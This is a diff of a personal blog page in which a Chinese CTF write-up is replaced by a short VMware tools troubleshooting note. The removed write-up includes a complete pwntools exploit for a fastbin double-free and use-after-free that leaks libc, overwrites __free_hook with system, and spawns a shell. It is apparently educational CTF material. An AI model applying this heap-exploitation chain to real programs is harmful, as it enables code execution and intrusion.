@@ -8,7 +8,7 @@
 
 <head>
 
-  <title>Message | Rin</title>
+  <title>vmware fusion无法复制粘贴问题.md | Rin</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -45,9 +45,6 @@
   
 
   <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
-<link rel="stylesheet" href="/assets/css/APlayer.min.css" class="aplayer-style-marker">
-<script src="/assets/js/APlayer.min.js" class="aplayer-script-marker"></script>
-<script src="/assets/js/Meting.min.js" class="meting-script-marker"></script>
 <link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
 
 <!--
@@ -230,50 +227,34 @@
         <div class="row col-md-offset-2">
             <div class="col-md-8">
     			<span class="post-meta">
-      <time datetime="2021-05-24T09:18:33.269Z" itemprop="datePublished">
-          2021-05-24
+      <time datetime="2022-07-15T14:28:51.623Z" itemprop="datePublished">
+          2022-07-15
       </time>
     
-    
-    | 
-    <a href='/tags/UAF/'>UAF</a>
-    
-    
 </span>
-                <h1>Message</h1>
+                <h1>vmware fusion无法复制粘贴问题.md</h1>
             </div>
         </div>
         <div class="col-md-8 col-md-offset-2">
-      		
-    <div id="aplayer-CUrzUXsq" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div> 
+      		<p>Ubuntu20.04安装vmware tools时显示segment fault，虽然最后显示成功安装，但是没有任何效果，依旧不能复制粘贴。</p>
+<p>解决方式：</p>
+<p>首先删除已经安装的vmware tools。具体方法是</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> vmware-tools-distrib/bin</span><br><span class="line">sudo ./vmware-uninstall-tools.pl</span><br></pre></td></tr></table></figure>
 
-<p>第二道fastbin double free。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(*(<span class="keyword">void</span> **)&amp;dword_602060[<span class="number">4</span> * v1 + <span class="number">2</span>]);</span><br><span class="line">      dword_602060[<span class="number">4</span> * v1] = <span class="number">0</span>;</span><br><span class="line">      --dword_60204C;</span><br></pre></td></tr></table></figure>
+<p>接着直接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install open-vm-tools open-vm-tools-desktop</span><br></pre></td></tr></table></figure>
 
-<p>这里没有把指针置为null，所以会产生uaf漏洞。</p>
-<p>ida大体分析了一下就会发现，由于没有后门函数，这道题会比上一道难。而且由于RELRO的开启，got所在的数据段是只读的，这里研究一下relro这个保护。</p>
-<p>uaf漏洞的利用方式有多种，其中就有修改got表达到任意地址写，从而getshel。但是RELRO这个保护，通过将got表所在的地址变成只读，有效阻止了got表覆盖攻击。</p>
-<!--具体可见https://blog.csdn.net/ylcangel/article/details/102625948-->
-
-<p>所以说这道题我们不能用覆盖got表的方式来getshell，而是需要用freehook劫持的方式。</p>
-<p>大体思路是先通过fastbin double free构造fake chunk指向储存chunk的content的地址并泄露puts函数的真实地址，再获得libc基址，借此修改freehook，使它指向system并调用。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;124.70.35.238&#x27;,23717)</span></span><br><span class="line">p = process(<span class="string">&#x27;./message&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./message&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content = <span class="string">b&#x27;a&#x27;</span></span>):</span></span><br><span class="line">	p.sendafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendafter(<span class="string">&#x27;:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">	p.sendafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">	p.sendafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	p.sendafter(<span class="string">&#x27;:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">	p.sendafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	p.sendafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x30</span>)<span class="comment">#chunk0,set as the fake chunk</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#chunk1</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#chunk2</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)<span class="comment">#fastbin: chunk1--&gt;chunk2--&gt;chunk1</span></span><br><span class="line"></span><br><span class="line">fake_chunk_addr = <span class="number">0x602060</span> - <span class="number">0x8</span></span><br><span class="line">add(<span class="number">0x20</span>,p64(fake_chunk_addr))<span class="comment">#chunk3--&gt;1</span></span><br><span class="line"><span class="comment">#fastbin: fake_chunk--&gt;chunk1--&gt;chunk2--&gt;chunk1</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#chunk4--&gt;2</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#chunk5--&gt;1</span></span><br><span class="line">add(<span class="number">0x20</span>,p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))<span class="comment">#chunk6..&gt;fake chunk</span></span><br><span class="line"><span class="comment">#leak the address</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">puts = u64(recv(<span class="number">6</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts)</span><br><span class="line">libc_base = puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">free_hook = libc_base + libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,p64(free_hook))</span><br><span class="line">edit(<span class="number">0</span>,p64(system))</span><br><span class="line"><span class="comment">#free_hook = system</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;/bin/shx00&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment">#process system(/bin/sh)</span></span><br></pre></td></tr></table></figure>
-
-
-
+<p>安装以后尝试一下能不能复制，不能的话尝试重启，反正我重启以后就好了。</p>
+<p>之前搜索方式有问题，关键词是无法复制，换了一个段错误的关键词就行了。</p>
 
             <div class="clearfix"></div>
             <hr class="nogutter">
         </div>
         <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
     
-    <a class="pull-left" href="../../../08/02/stack_ret2dl_advanced/" style="float: left;">
-        ← ret2dl_advanced
-    </a>
     
-    
-    <a class="pull-right" href="../../../04/24/sum_%E6%9D%82%E7%A2%8E%E7%9A%84%E6%8C%87%E4%BB%A4/">
-        杂碎的指令 →
+    <a class="pull-right" href="../../14/kernel_%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
+        kernel环境+基础知识 →
     </a>
     
 </nav>
